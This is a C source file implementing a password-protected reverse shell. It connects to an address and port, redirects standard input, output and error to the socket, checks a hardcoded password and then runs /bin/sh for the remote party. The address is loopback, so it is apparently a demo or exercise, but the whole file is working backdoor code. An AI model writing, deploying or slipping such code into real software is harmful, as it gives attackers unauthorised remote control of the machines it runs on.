#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <string.h>

int main()
{
    // 1. Create socket
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    // 2. Connect socket to remote port and address
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5050);
    addr.sin_addr.s_addr = inet_addr("127.1.1.1");
    connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr));

    // 3. Duplicate stdin, stdout and stderr file descriptors
    dup2(socket_fd, STDIN_FILENO);
    dup2(socket_fd, STDOUT_FILENO);
    dup2(socket_fd, STDERR_FILENO);

    // 4. Check password
    char buf[16];
    char password[] = "somesecret";
    read(socket_fd, buf, 16);
    buf[strcspn(buf, "\n")] = 0;
    if (strcmp(password, buf) == 0)
    {
        // 5. Spawn shell
        execve("/bin/sh", NULL, NULL);
    }
}
